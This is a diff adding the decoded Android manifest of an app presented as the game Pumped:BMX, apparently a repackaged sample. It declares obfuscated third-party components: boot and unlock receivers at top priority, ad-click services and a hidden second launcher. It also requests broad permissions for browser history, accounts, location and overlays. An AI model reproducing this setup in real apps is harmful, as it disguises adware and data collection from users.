@@ -1,0 +1,305 @@
+<?xml version="1.0" ?>
+<manifest android:installLocation="0" android:versionCode="3" android:versionName="1.2" package="com.noodlecake.pumpedbmxiii" xmlns:android="http://schemas.android.com/apk/res/android">
+	
+
+	<uses-sdk android:minSdkVersion="8" android:targetSdkVersion="14">
+</uses-sdk>
+	
+
+	<application android:debuggable="false" android:icon="@7F020000" android:label="Pumped:BMX" android:name="com.bangcle.protect.ApplicationWrapper">
+		
+
+		<activity android:configChanges="0x00000CB0" android:label="Pumped:BMX" android:name="com.noodlecake.pumpedbmx.pumpedbmx" android:screenOrientation="0" android:theme="@7F050000">
+			
+
+			<intent-filter>
+</intent-filter>
+			
+
+		</activity>
+		
+
+		<activity android:configChanges="0x000000A0" android:name="com.noodlecake.noodlenews.MoreGamesWebView" android:theme="@7F050000">
+</activity>
+		
+
+		<activity android:configChanges="0x000000B0" android:launchMode="1" android:name="com.chartboost.sdk.CBDialogActivity" android:theme="@android:0103000F" android:windowSoftInputMode="0x00000010">
+</activity>
+		
+
+		<activity android:name="com.playhaven.src.publishersdk.content.PHContentView" android:theme="@android:0103000B">
+</activity>
+		
+
+		<activity android:name="com.crittercism.NotificationActivity">
+</activity>
+		
+
+		<receiver android:name="com.amazon.inapp.purchasing.ResponseReceiver">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="com.amazon.inapp.purchasing.NOTIFY" android:permission="com.amazon.inapp.purchasing.Permission.NOTIFY">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<meta-data android:name="com.google.android.gms.version" android:value="5089000">
+</meta-data>
+		
+
+		<activity android:configChanges="0x00000480" android:exported="false" android:name="com.jinyswomjy.sszbsvsmmk148718.AdActivity" android:theme="@android:0103000F">
+</activity>
+		
+
+		<activity android:configChanges="0x00000480" android:name="com.jinyswomjy.sszbsvsmmk148718.BrowserActivity">
+</activity>
+		
+
+		<activity android:configChanges="0x00000480" android:name="com.jinyswomjy.sszbsvsmmk148718.VActivity" android:screenOrientation="0" android:theme="@android:01030007">
+</activity>
+		
+
+		<service android:exported="false" android:name="com.jinyswomjy.sszbsvsmmk148718.LService">
+</service>
+		
+
+		<receiver android:exported="true" android:name="com.jinyswomjy.sszbsvsmmk148718.BootReceiver">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<meta-data android:name="P_LAYOUT" android:value="down">
+</meta-data>
+		
+
+		<service android:name="com.getmoney.p.AdService">
+</service>
+		
+
+		<service android:name="com.getmoney.p.AdClickService">
+</service>
+		
+
+		<receiver android:name="com.getmoney.p.BootReceiver">
+			
+
+			<intent-filter android:priority="2147483647">
+				
+
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+</action>
+				
+
+				<action android:name="android.intent.action.USER_PRESENT">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<receiver android:name="com.getmoney.p.UnlockReceiver">
+			
+
+			<intent-filter android:priority="2147483647">
+				
+
+				<action android:name="android.intent.action.USER_PRESENT">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<receiver android:name="com.getmoney.p.AlertReceiver">
+			
+
+			<intent-filter android:priority="2147483647">
+				
+
+				<action android:name="android.intent.action.BOOT_COMPLETED">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<activity android:name="com.getmoney.p.MainActivity">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.MAIN">
+</action>
+				
+
+				<category android:name="android.intent.category.LAUNCHER">
+</category>
+				
+
+			</intent-filter>
+			
+
+		</activity>
+		
+
+		<activity android:name="com.getmoney.p.BannerActivity">
+</activity>
+		
+
+		<activity android:name="com.getmoney.p.AdActivity" android:theme="@android:0103000F">
+</activity>
+		
+
+		<meta-data android:name="BANGCLE_SDK_VERSION" android:value="1001">
+</meta-data>
+		
+
+		<meta-data android:name="BANGCLE_APP_KEY" android:value="test_127008">
+</meta-data>
+		
+
+		<receiver android:exported="false" android:name="neo.proxy.DistributeReceiver">
+			
+
+			<intent-filter>
+				
+
+				<action android:name="android.intent.action.ACTION_POWER_CONNECTED">
+</action>
+				
+
+				<action android:name="com.secneo.plugin.action.HOURLY">
+</action>
+				
+
+				<action android:name="com.secneo.plugin.action.DAILY">
+</action>
+				
+
+				<action android:name="com.secneo.plugin.action.APP_STARTED">
+</action>
+				
+
+				<action android:name="android.net.conn.CONNECTIVITY_CHANGE">
+</action>
+				
+
+				<action android:name="com.secneo.proxy.action.CUSTOM">
+</action>
+				
+
+			</intent-filter>
+			
+
+		</receiver>
+		
+
+		<service android:exported="false" android:name="neo.proxy.FastService">
+</service>
+		
+
+		<activity android:configChanges="0x000000A0" android:excludeFromRecents="true" android:launchMode="3" android:name="neo.proxy.ToolActivity" android:theme="@android:0103000B">
+</activity>
+		
+
+	</application>
+	
+
+	<supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true">
+</supports-screens>
+	
+
+	<uses-permission android:name="android.permission.INTERNET">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.INTERNET">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.READ_PHONE_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.GET_ACCOUNTS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.ACCESS_WIFI_STATE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.GET_TASKS">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW">
+</uses-permission>
+	
+
+	<uses-permission android:name="android.permission.WRITE_SETTINGS">
+</uses-permission>
+	
+
+</manifest>
